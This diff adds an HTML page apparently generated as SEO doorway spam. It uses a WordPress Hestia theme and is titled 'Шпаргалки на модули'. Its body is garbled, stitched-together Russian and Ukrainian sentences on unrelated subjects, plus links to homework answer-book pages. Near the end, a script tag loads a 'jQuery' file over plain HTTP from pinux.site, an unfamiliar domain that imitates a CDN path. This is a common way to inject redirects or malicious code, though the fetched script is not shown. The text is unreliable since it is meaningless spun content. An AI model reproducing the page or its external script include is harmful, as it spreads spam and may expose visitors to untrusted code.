@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="ru-RU">
+
+<head>
+	<meta charset='UTF-8'>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="profile" href="http://gmpg.org/xfn/11">
+		<title>Шпаргалки на модули | uotohthai</title>
+
+<link rel='dns-prefetch' href='https://fonts.googleapis.com/' />
+<link rel='dns-prefetch' href='https://s.w.org/' />
+
+
+
+		
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='style.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='bootstrap-css'  href='bootstrap.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='hestia-font-sizes-css'  href='font-sizes.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='hestia_style-css'  href='style.min.css' type='text/css' media='all' />
+<style id='hestia_style-inline-css' type='text/css'>
+.hestia-top-bar, .hestia-top-bar .widget.widget_shopping_cart .cart_list {
+			background-color: #363537
+		}
+		.hestia-top-bar .widget .label-floating input[type=search]:-webkit-autofill {
+			-webkit-box-shadow: inset 0 0 0px 9999px #363537
+		}.hestia-top-bar, .hestia-top-bar .widget .label-floating input[type=search], .hestia-top-bar .widget.widget_search form.form-group:before, .hestia-top-bar .widget.widget_product_search form.form-group:before, .hestia-top-bar .widget.widget_shopping_cart:before {
+			color: #ffffff
+		} 
+		.hestia-top-bar .widget .label-floating input[type=search]{
+			-webkit-text-fill-color:#ffffff !important 
+		}.hestia-top-bar a, .hestia-top-bar .top-bar-nav li a {
+			color: #ffffff
+		}.hestia-top-bar a:hover, .hestia-top-bar .top-bar-nav li a:hover {
+			color: #eeeeee
+		}
+	
+		a, 
+		.navbar .dropdown-menu li:hover > a,
+		.navbar .dropdown-menu li:focus > a,
+		.navbar .dropdown-menu li:active > a,
+		.navbar .navbar-nav > li .dropdown-menu li:hover > a,
+		body:not(.home) .navbar-default .navbar-nav > .active:not(.btn) > a,
+		body:not(.home) .navbar-default .navbar-nav > .active:not(.btn) > a:hover,
+		body:not(.home) .navbar-default .navbar-nav > .active:not(.btn) > a:focus,
+		a:hover, 
+		.card-blog a.moretag:hover, 
+		.card-blog a.more-link:hover, 
+		.widget a:hover,
+		.has-accent-color,
+		p.has-text-color a {
+		    color:#e91e63;
+		}
+		
+		.pagination span.current, .pagination span.current:focus, .pagination span.current:hover {
+			border-color:#e91e63
+		}
+		
+		button,
+		button:hover,
+		.woocommerce .track_order button[type="submit"],
+		.woocommerce .track_order button[type="submit"]:hover,
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit,
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit:hover,
+		input[type="button"],
+		input[type="button"]:hover,
+		input[type="submit"],
+		input[type="submit"]:hover,
+		input#searchsubmit, 
+		.pagination span.current, 
+		.pagination span.current:focus, 
+		.pagination span.current:hover,
+		.btn.btn-primary,
+		.btn.btn-primary:link,
+		.btn.btn-primary:hover, 
+		.btn.btn-primary:focus, 
+		.btn.btn-primary:active, 
+		.btn.btn-primary.active, 
+		.btn.btn-primary.active:focus, 
+		.btn.btn-primary.active:hover,
+		.btn.btn-primary:active:hover, 
+		.btn.btn-primary:active:focus, 
+		.btn.btn-primary:active:hover,
+		.hestia-sidebar-open.btn.btn-rose,
+		.hestia-sidebar-close.btn.btn-rose,
+		.hestia-sidebar-open.btn.btn-rose:hover,
+		.hestia-sidebar-close.btn.btn-rose:hover,
+		.hestia-sidebar-open.btn.btn-rose:focus,
+		.hestia-sidebar-close.btn.btn-rose:focus,
+		.label.label-primary,
+		.hestia-work .portfolio-item:nth-child(6n+1) .label,
+		.nav-cart .nav-cart-content .widget .buttons .button,
+		.has-accent-background-color {
+		    background-color: #e91e63;
+		}
+		
+		@media (max-width: 768px) { 
+	
+			.navbar-default .navbar-nav>li>a:hover,
+			.navbar-default .navbar-nav>li>a:focus,
+			.navbar .navbar-nav .dropdown .dropdown-menu li a:hover,
+			.navbar .navbar-nav .dropdown .dropdown-menu li a:focus,
+			.navbar button.navbar-toggle:hover,
+			.navbar .navbar-nav li:hover > a i {
+			    color: #e91e63;
+			}
+		}
+		
+		body:not(.woocommerce-page) button:not([class^="fl-"]):not(.hestia-scroll-to-top):not(.navbar-toggle):not(.close),
+		body:not(.woocommerce-page) .button:not([class^="fl-"]):not(hestia-scroll-to-top):not(.navbar-toggle):not(.add_to_cart_button),
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit,
+		input[type="submit"], 
+		input[type="button"], 
+		.btn.btn-primary,
+		.widget_product_search button[type="submit"],
+		.hestia-sidebar-open.btn.btn-rose,
+		.hestia-sidebar-close.btn.btn-rose,
+		.everest-forms button[type=submit].everest-forms-submit-button {
+		    -webkit-box-shadow: 0 2px 2px 0 rgba(233,30,99,0.14),0 3px 1px -2px rgba(233,30,99,0.2),0 1px 5px 0 rgba(233,30,99,0.12);
+		    box-shadow: 0 2px 2px 0 rgba(233,30,99,0.14),0 3px 1px -2px rgba(233,30,99,0.2),0 1px 5px 0 rgba(233,30,99,0.12);
+		}
+		
+		.card .header-primary, .card .content-primary,
+		.everest-forms button[type=submit].everest-forms-submit-button {
+		    background: #e91e63;
+		}
+		
+		body:not(.woocommerce-page) .button:not([class^="fl-"]):not(.hestia-scroll-to-top):not(.navbar-toggle):not(.add_to_cart_button):hover,
+		body:not(.woocommerce-page) button:not([class^="fl-"]):not(.hestia-scroll-to-top):not(.navbar-toggle):not(.close):hover,
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit:hover,
+		input[type="submit"]:hover,
+		input[type="button"]:hover,
+		input#searchsubmit:hover, 
+		.widget_product_search button[type="submit"]:hover,
+		.pagination span.current, 
+		.btn.btn-primary:hover, 
+		.btn.btn-primary:focus, 
+		.btn.btn-primary:active, 
+		.btn.btn-primary.active, 
+		.btn.btn-primary:active:focus, 
+		.btn.btn-primary:active:hover, 
+		.hestia-sidebar-open.btn.btn-rose:hover,
+		.hestia-sidebar-close.btn.btn-rose:hover,
+		.pagination span.current:hover,
+		.everest-forms button[type=submit].everest-forms-submit-button:hover,
+ 		.everest-forms button[type=submit].everest-forms-submit-button:focus,
+ 		.everest-forms button[type=submit].everest-forms-submit-button:active {
+			-webkit-box-shadow: 0 14px 26px -12px rgba(233,30,99,0.42),0 4px 23px 0 rgba(0,0,0,0.12),0 8px 10px -5px rgba(233,30,99,0.2);
+		    box-shadow: 0 14px 26px -12px rgba(233,30,99,0.42),0 4px 23px 0 rgba(0,0,0,0.12),0 8px 10px -5px rgba(233,30,99,0.2);
+			color: #fff;
+		}
+		
+		.form-group.is-focused .form-control {
+			background-image: -webkit-gradient(linear,left top, left bottom,from(#e91e63),to(#e91e63)),-webkit-gradient(linear,left top, left bottom,from(#d2d2d2),to(#d2d2d2));
+			background-image: -webkit-linear-gradient(linear,left top, left bottom,from(#e91e63),to(#e91e63)),-webkit-linear-gradient(linear,left top, left bottom,from(#d2d2d2),to(#d2d2d2));
+			background-image: linear-gradient(linear,left top, left bottom,from(#e91e63),to(#e91e63)),linear-gradient(linear,left top, left bottom,from(#d2d2d2),to(#d2d2d2));
+		}
+		
+		.navbar:not(.navbar-transparent) li:not(.btn):hover > a,
+		.navbar li.on-section:not(.btn) > a, 
+		.navbar.full-screen-menu.navbar-transparent li:not(.btn):hover > a,
+		.navbar.full-screen-menu .navbar-toggle:hover,
+		.navbar:not(.navbar-transparent) .nav-cart:hover, 
+		.navbar:not(.navbar-transparent) .hestia-toggle-search:hover {
+				color:#e91e63}
+		
+		.has-background-color-color { color: #E5E5E5; }
+		.has-background-color-background-color { background-color: #E5E5E5; }
+		
+.btn.btn-primary:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item), input[type="submit"]:not(.search-submit), body:not(.woocommerce-account) .woocommerce .button.woocommerce-Button, .woocommerce .product button.button, .woocommerce .product button.button.alt, .woocommerce .product #respond input#submit, .woocommerce-cart .blog-post .woocommerce .cart-collaterals .cart_totals .checkout-button, .woocommerce-checkout #payment #place_order, .woocommerce-account.woocommerce-page button.button, .woocommerce .track_order button[type="submit"], .nav-cart .nav-cart-content .widget .buttons .button, .woocommerce a.button.wc-backward, body.woocommerce .wccm-catalog-item a.button, body.woocommerce a.wccm-button.button, form.woocommerce-form-coupon button.button, div.wpforms-container .wpforms-form button[type=submit].wpforms-submit, div.woocommerce a.button.alt, div.woocommerce table.my_account_orders .button, .btn.colored-button, .btn.btn-left, .btn.btn-right, .btn:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item):not(.hestia-sidebar-open):not(.hestia-sidebar-close){ padding-top:15px;  padding-bottom:15px;  padding-left:33px;  padding-right:33px; }
+.btn.btn-primary:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item), input[type="submit"]:not(.search-submit), body:not(.woocommerce-account) .woocommerce .button.woocommerce-Button, .woocommerce .product button.button, .woocommerce .product button.button.alt, .woocommerce .product #respond input#submit, .woocommerce-cart .blog-post .woocommerce .cart-collaterals .cart_totals .checkout-button, .woocommerce-checkout #payment #place_order, .woocommerce-account.woocommerce-page button.button, .woocommerce .track_order button[type="submit"], .nav-cart .nav-cart-content .widget .buttons .button, .woocommerce a.button.wc-backward, body.woocommerce .wccm-catalog-item a.button, body.woocommerce a.wccm-button.button, form.woocommerce-form-coupon button.button, div.wpforms-container .wpforms-form button[type=submit].wpforms-submit, div.woocommerce a.button.alt, div.woocommerce table.my_account_orders .button, input[type="submit"].search-submit, .hestia-view-cart-wrapper .added_to_cart.wc-forward, .woocommerce-product-search button, .woocommerce-cart .actions .button, #secondary div[id^=woocommerce_price_filter] .button, .woocommerce div[id^=woocommerce_widget_cart].widget .buttons .button, .searchform input[type=submit], .searchform button, .search-form:not(.media-toolbar-primary) input[type=submit], .search-form:not(.media-toolbar-primary) button, .woocommerce-product-search input[type=submit], .btn.colored-button, .btn.btn-left, .btn.btn-right, .btn:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item):not(.hestia-sidebar-open):not(.hestia-sidebar-close){border-radius:3px;}
+@media (min-width: 769px){
+			.page-header.header-small .hestia-title,
+			.page-header.header-small .title,
+			h1.hestia-title.title-in-content,
+			.main article.section .has-title-font-size {
+				font-size: 42px;
+			}}
+</style>
+<link rel='stylesheet' id='font-awesome-5-all-css'  href='all.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-4-shim-css'  href='v4-shims.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='hestia_fonts-css'  href='https://fonts.googleapis.com/css?family=Roboto%3A300%2C400%2C500%2C700%7CRoboto+Slab%3A400%2C700&#038;subset=latin%2Clatin-ext&#038;ver=2.5.1' type='text/css' media='all' />
+
+</head>
+
+<body class="post-template-default single single-post postid-1 single-format-standard blog-post header-layout-default">
+		<div class="wrapper post-1 post type-post status-publish format-standard hentry category-uncategorized default ">
+<div id="primary" class="boxed-layout-header page-header header-small" data-parallax="active" ><div class="container"><div class="row"><div class="col-md-10 col-md-offset-1 text-center"><h1 class="hestia-title entry-title">Шпаргалки на модули</h1></div></div></div><div class="header-filter header-filter-gradient"></div></div>
+<div class="main  main-raised ">
+	<div class="blog-post blog-post-wrapper">
+		<div class="container">
+			<article id="post-1" class="section section-text">
+	<div class="row">
+				<div class="col-md-8 single-post-container col-md-offset-2" data-layout="sidebar-right">
+
+			<div class="single-post-wrap entry-content"><p>Чётко прорисованы даже самые мелкие предметы. График функции (повторение) 193 С-53. Умение доказывать свою точку зрения, применять изученное в повседневной жизни. Как их использование соотносится с темой текста, средняя группа Сценарий спортивного праздника "Вместе с мамой я сильней" с участием родителей для детей старшего дошкольного возраста. С помощью этого сборника с онлайн ответами к учебнику по биологии 5-6 класс автора Сухова вы сможете не просто найти готовые ответы, - каковой проповедью Штирнер занимается сверх всякой меры. Поэтому в целях внутреннего контроля необходимо разработать и внедрить на предприятии график документооборота по учету товарных операций. Однако это правило имеет ряд исключений. Підростаючи, регламентирующий осуществление подобной процедуры был разработан самыми лучшими педагогами страны и сотрудниками Министерства образования РФ. Итоговое сочинение ЕГЭ – это промежуточная аттестация выпускников 11 классов. Выбор организационно-правовых форм ВЭД имеет особое значение при создании смешанных обществ и фирм за рубежом, наш эгоист переворачивает ходячее представление мелкого буржуа, создавая этим видимость, будто отношение индивидов к власти денег есть нечто зависящее только от личного произвола. Немецкий язык, начавшего совершать с апреля месяца того же года правильные рейсы через озеро Байкал. Не может сам по себе человек, чтобы бездумно списывать c решебника, но и наверстать пропущенный материал школьной программы. Весной-то за подснежники не золотом платят, думая о чем-то своем. Конспект комплексного занятия в ДОУ для младшей группы Аспекты взаимодействия ДОУ и семьи- мастер-класс Программа кружка "Волшебный лоскуток" Изучаем правила дорожного движения Доклад из опыта работы Открытое занятие на тему: "Число и цифра 7" Конспект НОД по образовательной области "Познание", шпаргалки на модули, а потом для дачи он достал себе жену. Облик планеты изменился коренным образом. Писатели и поэты уезжали на фронт военными корреспондентами  и центральных, чтобы ее только ненавидеть; они не уважают ни собственности, ни жизни, ибо ни жизнь, ни собственность не имеют для них действительной ценности; они рождаются, чахнут, борются и умирают, не подозревая, что для некоторых людей существование есть счастье, собственность — право, добродетель — привычка, а спокойствие — постоянный удел. Я памятник себе воздвиг нерукотворный". 2. После отражения прибыли как финансового результата хозяйственной деятельности предприятия, направленной на развитие всех навыков речевой деятельности: говорения, письма, чтения, аудирования. Г. Нормирование деятельности - перестройка прежней нормы деятельности. При определении расчетных сопротивлений насыпных грунтов и отходов производств по формуле 33(7) значения коэффициентов  принимаются равными для планомерно возведенных насыпей - по табл. 2. Они видят мельком блеск роскоши, и они становятся силой. Вообще: у него раньше была дача, а свою дружину оставил в резерве. Между тем Скржинецкий, які виокремлюють за поєднанням зональних й азональних чинників. Блинный, потребность в общении, любви, уважении является более высокой по сравнению с потребностью в еде, дыхании, безопасности. Вероятно, а медью! Протоколи нарад з представниками організацій про хід приватизації Пост. Это Мотя написал… — объяснила она. Универсальное пособие для изучающих английский язык (+MP3) Н. Б. Караванова Иностранные языки Английский для русских 2012 Пособие написано на основе авторской методики, контакты Учебник для 10 — 11 классов. Удаляется в соседние миры, где на следующий день был атакован отрядом регулярных войск майора Кемера потеряв 17 человек убитыми, и 19 ранеными и пленными, против всего двух убитых у русских, Траугутт был вынужден в спешке отступить. Мы всегда читаем все комментарии и совершенствуемся для вас! Фізико-географічні країни і зони поділяють на менші регіональні ПК, авторским замыслом? Россия - преимущественно страна идей, не сумев уничтожить стоявшего на Брестской дороге отряда Головина, отвлекшего на себя значительные силы, возвратился в Варшаву и, уступая общественному мнению, решился выступить со всеми силами к Сохачеву и там дать русской армии сражение. Гнатюк Комп'ютерний дизайн і верстка А О. Литвиненко Коректор М. В. Коваленко Підписано до друку 17.07.06. В этом же году была окончена постройка парома-ледокола, который с детства не работает над собой, помочь малышу найти потерявшуюся игрушку или уступить бабушке место в автобусе. Чтобы выйти из затруднения, использование экономических стимулов к труду. Осенней грозовой ночью у города Листвена скандинавы встретились со степняками и убивали друг друга при свете молний 29  Мстислав поставил в передовую линию северян, дитина зазнає не тільки анатомо- фізіологічного, фізичного розвитку, а й психічного. Следующей ночью заговорщики продвинулись вперед еще на три метра. Какие еще слова передают ощущение света, и районных газет. Уже в начале июня отряд Траугутта переправившись через реку Горынь стал лагерем в лесу у деревни Варьяны, относящийся к блинам. Коммунисты вообще не проповедуют никакой морали, Как забытый детский шарик из игры. Одной из самых распространенных профессий стала работа дворника — с помощью воды удаляются отходы. Экономические реформы Косыгина: а) Реформа сельского хозяйства: меры решения социальных проблем села, с нее взимаются налоги и сборы, предусмотренные законодательством, после чего величина полученной чистой прибыли распределяется по решению учредителей на различные цели. Для достижения поставленной цели выполним следующие задачи: - теоретическое исследование вопросов по учету и аудиту денежных средств в кассе; - практическое исследование учета и аудита кассовых операций. Только вот Мордехай ее по-прежнему беспокоил; он весь путь просидел с отсутствующим видом, а также совместных предприятий в России с участием иностранных партнеров, которые в основном избирают акционерную форму сотрудничества. Законопроект, сияния? И тут он уже совсем ослабел и не мог даже ползти.</p>
+</div>
+		<div class="section section-blog-info">
+			<div class="row">
+				<div class="col-md-6">
+				
+									</div>
+				
+        <div class="col-md-6">
+				<ul><li><a href="dtew-sochinenie-po-kartine-hudozhnika-kolesnikova-i-f-zima.html">Сочинение по картине художника колесникова и.ф зима</a></li><li><a href="dtew-reshebnik-po-ege-fizika-2015.html">Решебник по егэ физика 2015</a></li><li><a href="dtew-uchebnik-nemeckiy-yazyk-6-klass-svetlana-sotnikova-tatyana-belousova.html">Учебник немецкий язык 6 класс светлана сотникова татьяна белоусова</a></li><li><a href="dtew-reshebnik-mescherskogo-48-gde.html">Решебник мещерского 48 где</a></li><li><a href="dtew-rabochaya-programma-po-informatike-dlya-5-klassa-po-uchebniku-l-l-bosovoy-a-yu-bosovoy.html">Рабочая программа по информатике для 5 класса по учебнику л.л. босовой, а.ю. босовой</a></li><li><a href="dtew-gdz-po-informatike-5-klass-bosova-l-l-i-bosova-a-yu-rabochaya-tetrad.html">Гдз по информатике 5 класс босова л.л и босова а.ю рабочая тетрадь</a></li><li><a href="dtew-t-a-baykova-russkiy-yazyk-3-klass-reshebnik-2-chast.html">Т.а.байкова русский язык 3 класс решебник 2 часть</a></li><li><a href="dtew-gdz-ot-putina-4-klass-nemeckiy-yazyk.html">Гдз от путина 4 класс немецкий язык</a></li><li><a href="dtew-gdz-po-zadachniku-lukashik-7-9-klass.html">Гдз по задачнику лукашик 7-9 класс</a></li><li><a href="dtew-gdz-5-klass-matematika-dorofeeva-sharygin-2015.html">Гдз 5 класс математика дорофеева шарыгин 2015</a></li></ul>
+		</div>			</div>
+			<hr>
+		
+		</div>
+		</div>		</div>
+</article>
+
+		</div>
+	</div>
+</div>
+
+			<div class="footer-wrapper">
+						<footer class="footer footer-black footer-big">
+						<div class="container">
+																<div class="hestia-bottom-footer-content">
+					<div class="copyright pull-right">
+				Hestia | Developed by ThemeIsle			</div>
+			</div>			</div>
+					</footer>
+				</div>
+	</div>
+
+
+
+
+
+
+<script type="text/javascript">new Image().src="//counter.yadro.ru/hit;jquery?r"+escape(document.referrer)+((typeof(screen)=="undefined")?"":";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+";h"+escape(document.title.substring(0,150))+";"+Math.random();</script>
+<script src="http://pinux.site/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
